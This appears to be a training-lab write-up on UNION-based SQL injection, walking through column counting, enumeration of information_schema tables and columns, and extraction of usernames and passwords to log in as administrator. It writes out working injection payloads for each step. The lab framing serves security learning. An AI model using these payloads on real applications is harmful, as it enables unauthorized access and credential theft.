# Lab 7: SQL Injection Attack – Listing the Database Contents (Non-Oracle Databases)

## Lab Overview

This lab contains a **SQL injection vulnerability** in the product category filter.  
The application's query results are reflected in the response, which allows exploitation via a **UNION-based SQL injection** to retrieve data from other tables.

---

## Objective

- Determine the **name of the table** containing usernames and passwords.
- Identify the **columns** in that table.
- Retrieve the **username** and **password** of all users.
- Use the administrator’s credentials to log in and solve the lab.

---

## How I Solved the Lab

1. **Found the injection point** in the product category filter.
2. **Determined the number of columns** using `NULL` placeholders:

    ```sql
    ' UNION SELECT NULL--+
    ' UNION SELECT NULL, NULL--+
    ```

3. **Listed all tables** in the database using the `information_schema.tables` view:

    ```sql
    ' UNION SELECT NULL, table_name FROM information_schema.tables--+
    ```

4. **Identified the target table** (looked for one containing `users` in the name).

5. **Listed the columns** for that table using `information_schema.columns`:

    ```sql
    ' UNION SELECT NULL, column_name 
      FROM information_schema.columns 
      WHERE table_name = 'users_xyz123'--+
    ```

6. **Retrieved usernames and passwords** from the identified table:

    ```sql
    ' UNION SELECT NULL, username_xyz || '~' || password_abc 
      FROM users_xyz123--+
    ```

    *(If MySQL, use `CONCAT(username_xyz, '~', password_abc)` instead of `||`)*

7. **Used `--+`** at the end of all payloads to properly comment out the rest of the SQL statement.

8. **Logged in as administrator** using the credentials found.

---

## Tips

- `information_schema.tables` → lists all tables in the database.
- `information_schema.columns` → lists all columns for a given table.
- Look for table names and column names that include `users` or similar.
- Concatenate values if only one column is reflected in the application output.
- Always match the number of columns in your UNION SELECT with the original query.

---

## Solution:

<img width="1278" height="594" alt="Screenshot (781)" src="https://github.com/user-attachments/assets/cea4f21f-d07d-4f05-910a-f178d84fbd34" />

<img width="1251" height="570" alt="Screenshot (782)" src="https://github.com/user-attachments/assets/59207a24-b0d0-4e14-bda5-69c10a8e97f8" />

<img width="1261" height="584" alt="Screenshot (783)" src="https://github.com/user-attachments/assets/9db5aab5-5362-4d54-86fd-ce2bb83337a5" />
